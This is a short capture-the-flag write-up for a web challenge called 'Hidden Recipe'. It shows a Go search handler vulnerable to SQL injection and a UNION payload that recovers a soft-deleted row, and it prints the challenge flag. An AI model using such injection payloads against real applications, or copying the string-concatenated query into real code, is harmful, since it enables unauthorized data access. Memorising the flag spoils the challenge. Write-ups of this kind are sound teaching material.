# Hidden Recipe

`main.go` has SQL injection in the search handler:

```go
q := r.URL.Query().Get("q")
db.Where("title LIKE '%" + q + "%'").Find(&recipes)
```

The app also seeds the flag into a recipe, then soft-deletes it:

```go
secret := Recipe{Title: "Secret Recipe", Description: os.Getenv("FLAG")}
db.Create(&secret)
db.Delete(&secret)
```

Because the query is built by string concatenation, we can close the `LIKE` string and append a `UNION` that reads directly from `recipes`, bypassing GORM's default soft-delete filter on the original query.

Payload:

```text
' UNION SELECT * FROM recipes --
```

Request:

```text
/search?q=%27+UNION+SELECT+*+FROM+recipes+--+
```

That returns the deleted row:

```text
Secret Recipe
CPCTF{k!MChI_FR!ed_RiC3_w1th_MaY0nnA1s3}
```

Flag:

```text
CPCTF{k!MChI_FR!ed_RiC3_w1th_MaY0nnA1s3}
```

`solve.py` sends the payload to the live site and prints the recovered recipe title and flag.
